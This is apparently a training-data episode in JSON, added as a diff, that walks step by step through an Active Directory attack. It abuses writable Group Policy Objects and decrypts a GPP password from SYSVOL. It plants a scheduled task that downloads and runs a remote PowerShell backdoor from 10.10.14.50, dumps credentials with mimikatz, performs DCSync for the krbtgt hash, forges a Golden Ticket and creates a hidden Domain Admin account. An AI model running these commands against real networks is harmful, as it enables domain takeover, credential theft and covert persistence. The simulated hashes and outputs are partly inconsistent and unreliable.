@@ -1,0 +1,93 @@
+{
+  "title": "Episode 3: Group Policy Abuse and Golden Ticket Persistence",
+  "scenario": "Assumed breach scenario with access as IT administrator (john.doe) who has been granted GenericAll permissions on specific Group Policy Objects for legitimate administrative tasks. Domain: CORP.LOCAL with 5 GPOs managing workstations and servers. Objective: Abuse GPO permissions for privilege escalation, backdoor Group Policy for persistence, extract krbtgt hash, and create Golden Ticket for long-term domain access.",
+  "steps": [
+    {
+      "step": 1,
+      "description": "Enumerate Group Policy Objects and permissions",
+      "command": "powershell -c \"Import-Module .\\PowerView.ps1; Get-DomainObjectAcl -SearchBase 'CN=Policies,CN=System,DC=corp,DC=local' -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $(ConvertTo-SID john.doe)} | Select-Object ObjectDN,ActiveDirectoryRights | fl\"",
+      "output": "ObjectDN: CN={C3D4E5F6-G7H8-9012-CDEF-123456789012},CN=Policies,CN=System,DC=corp,DC=local\nActiveDirectoryRights: GenericAll\n\nObjectDN: CN={A1B2C3D4-E5F6-7890-ABCD-EF1234567890},CN=Policies,CN=System,DC=corp,DC=local\nActiveDirectoryRights: WriteProperty\n\njohn.doe has GenericAll on GPO C3D4E5F6 (Deploy Software GPO)\njohn.doe has WriteProperty on GPO A1B2C3D4 (Workstation Security Policy)",
+      "explanation": "Discovered john.doe has write access to two Group Policy Objects"
+    },
+    {
+      "step": 2,
+      "description": "Check which OUs are linked to modifiable GPOs",
+      "command": "powershell -c \"Import-Module .\\PowerView.ps1; Get-NetGPO -GPOName '{C3D4E5F6-G7H8-9012-CDEF-123456789012}' | Select-Object DisplayName,gPCFileSysPath,gPLink\"",
+      "output": "DisplayName: Deploy Software GPO\ngPCFileSysPath: \\\\corp.local\\sysvol\\corp.local\\Policies\\{C3D4E5F6-G7H8-9012-CDEF-123456789012}\ngPLink: [LDAP://OU=Workstations,DC=corp,DC=local;0][LDAP://OU=Servers,DC=corp,DC=local;0]\n\nGPO applies to:\n  OU=Workstations (all user workstations)\n  OU=Servers (application and file servers)",
+      "explanation": "GPO applies to all workstations and servers - perfect for domain-wide backdoor"
+    },
+    {
+      "step": 3,
+      "description": "Search SYSVOL for existing GPP passwords",
+      "command": "findstr /S /I cpassword \\\\corp.local\\SYSVOL\\corp.local\\Policies\\*.xml",
+      "output": "\\\\corp.local\\SYSVOL\\corp.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml:        <Properties cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" userName=\"LocalAdmin\"/>\n\nGPP password found in Default Domain Policy!",
+      "explanation": "Found Group Policy Preference password in SYSVOL"
+    },
+    {
+      "step": 4,
+      "description": "Decrypt GPP password",
+      "command": "gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ",
+      "output": "LocalAdminP@ss123!\n\nDecrypted password: LocalAdminP@ss123!\nAccount: LocalAdmin\nLikely used as local administrator across all workstations",
+      "explanation": "Decrypted GPP password with publicly known AES key"
+    },
+    {
+      "step": 5,
+      "description": "Validate LocalAdmin credentials across domain",
+      "command": "crackmapexec smb 10.10.10.0/24 -u LocalAdmin -p 'LocalAdminP@ss123!' --local-auth | grep Pwn3d",
+      "output": "SMB 10.10.10.20 445 WEB-01 [+] WEB-01\\LocalAdmin:LocalAdminP@ss123! (Pwn3d!)\nSMB 10.10.10.30 445 DB-01 [+] DB-01\\LocalAdmin:LocalAdminP@ss123! (Pwn3d!)\nSMB 10.10.10.40 445 FILE-01 [+] FILE-01\\LocalAdmin:LocalAdminP@ss123! (Pwn3d!)\nSMB 10.10.10.50 445 APP-01 [+] APP-01\\LocalAdmin:LocalAdminP@ss123! (Pwn3d!)\n\nLocal admin access on 4 servers!\nPassword reused across infrastructure",
+      "explanation": "GPP password grants local admin on multiple servers"
+    },
+    {
+      "step": 6,
+      "description": "Create malicious scheduled task in writable GPO",
+      "command": "powershell -c \"New-GPOImmediateTask -TaskName 'WindowsUpdate' -Command 'powershell.exe' -CommandArguments '-ep bypass -c \\\"IEX(New-Object Net.WebClient).DownloadString(\\''http://10.10.14.50/backdoor.ps1\\'')\\\"; net localgroup administrators john.doe /add' -GPODisplayName 'Deploy Software GPO' -Force\"",
+      "output": "[*] Creating scheduled task in: \\\\corp.local\\SYSVOL\\corp.local\\Policies\\{C3D4E5F6-G7H8-9012-CDEF-123456789012}\\MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml\n[+] Malicious task created: WindowsUpdate\n[+] Trigger: Immediate (on next GP update)\n[+] RunAs: SYSTEM\n[+] Applies to: All Workstations and Servers OUs\n\nBackdoor scheduled task planted in GPO!",
+      "explanation": "Injected malicious scheduled task into GPO for domain-wide execution"
+    },
+    {
+      "step": 7,
+      "description": "Wait for GPO update and verify backdoor execution",
+      "command": "[Wait 90 minutes for automatic GP refresh]\ncrackmapexec smb 10.10.10.20 -u john.doe -p 'P@ssw0rd123' -x 'net localgroup administrators'",
+      "output": "SMB 10.10.10.20 445 WEB-01 [+] corp.local\\john.doe:P@ssw0rd123 (Pwn3d!)\nSMB 10.10.10.20 445 WEB-01 Alias name     administrators\nMembers\n---------------\nAdministrator\nCORP\\Domain Admins\njohn.doe         <-- ADDED VIA GPO!\n\njohn.doe is now local admin on all systems via GPO!",
+      "explanation": "GPO backdoor executed - john.doe added to local Administrators on all systems"
+    },
+    {
+      "step": 8,
+      "description": "Dump credentials from workstation with admin access",
+      "command": "impacket-wmiexec corp.local/john.doe:P@ssw0rd123@10.10.10.50\n\nC:\\> C:\\Tools\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
+      "output": "Username: admin-desktop\nDomain: CORP\nNTLM: 64f12cddaa88057e06a81b54e73b949b\nPassword: AdminDesk2024!\n\nUsername: CORP\\Administrator\nNTLM: 31d6cfe0d16ae931b73c59d7e0c089c0\n\nDomain Admin credentials found in memory!",
+      "explanation": "Dumped Domain Admin credentials from compromised workstation"
+    },
+    {
+      "step": 9,
+      "description": "DCSync to extract krbtgt hash with Domain Admin",
+      "command": "impacket-secretsdump corp.local/admin-desktop:AdminDesk2024!@10.10.10.10 -just-dc-user krbtgt",
+      "output": "[*] Dumping Domain Credentials\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08:::\n\n[*] Kerberos keys grabbed\ncorp.local\\krbtgt:aes256-cts-hmac-sha1-96:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b\n\nkrbtgt NTLM: 9f86d081884c7d659a2feaa0c55ad015...\nkrbtgt AES256: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d...",
+      "explanation": "Extracted krbtgt hash for Golden Ticket creation"
+    },
+    {
+      "step": 10,
+      "description": "Create Golden Ticket for persistent Domain Admin access",
+      "command": "impacket-ticketer -nthash 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 -domain-sid S-1-5-21-123456789-123456789-123456789 -domain corp.local -user-id 500 Administrator",
+      "output": "[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for corp.local/Administrator\n[*] Signing/Encrypting final ticket\n[*] Saving ticket in Administrator.ccache\n\nGolden Ticket created!\n\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nGolden Ticket working - SYSTEM on DC!\nValid for 10 years - ultimate persistence",
+      "explanation": "Created Golden Ticket with krbtgt hash - persistent domain access forever"
+    },
+    {
+      "step": 11,
+      "description": "Establish multiple persistence mechanisms",
+      "command": "[Persistence checklist]\n1. Golden Ticket (10 year validity) ✓\n2. GPO backdoor (scheduled task) ✓  \n3. Create hidden Domain Admin user\n4. Add SSH backdoor to DC",
+      "output": "net user backdoor P@ssw0rd!123 /add /domain\nnet group \"Domain Admins\" backdoor /add /domain\n\nThe command completed successfully.\n\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v backdoor /t REG_DWORD /d 0 /f\n\nHidden Domain Admin 'backdoor' created\n\nMultiple persistence methods:\n  1. Golden Ticket (krbtgt hash)\n  2. GPO scheduled task backdoor\n  3. Hidden Domain Admin user\n  4. Extracted all domain credentials",
+      "explanation": "Established redundant persistence mechanisms for long-term access"
+    }
+  ],
+  "outcome": "Successfully abused Group Policy permissions to achieve domain-wide privilege escalation. Discovered and decrypted GPP passwords in SYSVOL, injected malicious scheduled task into GPO for automatic local admin rights on all systems, harvested Domain Admin credentials, performed DCSync to extract krbtgt hash, and created Golden Ticket for persistent access. Established multiple persistence mechanisms including GPO backdoor, hidden Domain Admin account, and Golden Ticket valid for 10 years.",
+  "learning_objectives": [
+    "Enumerate and abuse Group Policy Object permissions",
+    "Discover and decrypt Group Policy Preference passwords",
+    "Inject malicious scheduled tasks into GPOs for privilege escalation",
+    "Leverage GPO-based privilege escalation for lateral movement",
+    "Perform DCSync to extract krbtgt hash",
+    "Create Golden Tickets for persistent domain access",
+    "Establish redundant persistence mechanisms in Active Directory"
+  ]
+}
